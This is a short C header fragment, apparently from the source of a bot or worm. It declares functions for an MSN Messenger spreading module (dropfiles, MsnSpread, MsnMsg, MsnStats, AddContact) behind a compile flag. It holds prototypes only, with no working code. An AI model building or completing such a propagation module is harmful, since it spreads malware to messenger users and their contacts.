#ifndef NO_MSNSPREAD
int dropfiles(char *ZipName); 
DWORD WINAPI MsnSpread(LPVOID param);
DWORD WINAPI MsnMsg(LPVOID param);
DWORD WINAPI MsnStats(LPVOID param);
void AddContact(char *email);
#endif